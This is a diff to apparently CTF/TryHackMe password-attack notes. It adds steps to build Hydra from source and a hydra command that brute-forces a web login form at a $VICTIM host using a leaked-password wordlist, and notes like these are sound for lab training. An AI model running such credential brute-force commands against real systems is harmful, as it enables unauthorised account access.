@@ -64,6 +64,23 @@ john --wordlist=clinic.lst --rules=THM-Password-Attacks --stdout > dict.lst
 
 ## Web
 
+## Install Hydra
+
+If the version on your machine isn't working well.
+
+**Kali**
+
+```
+git clone https://github.com/vanhauser-thc/thc-hydra.git
+cd thc-hydra/
+./configure
+make
+make install
+
+./hydra -l $USERNAME -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt $VICTIM http-post-form "/auth/:username=^USER^&password=^PASS^:F=Incorrect username" -V
+
+```
+
 ### Crack a simple web login
 
 #### Examples
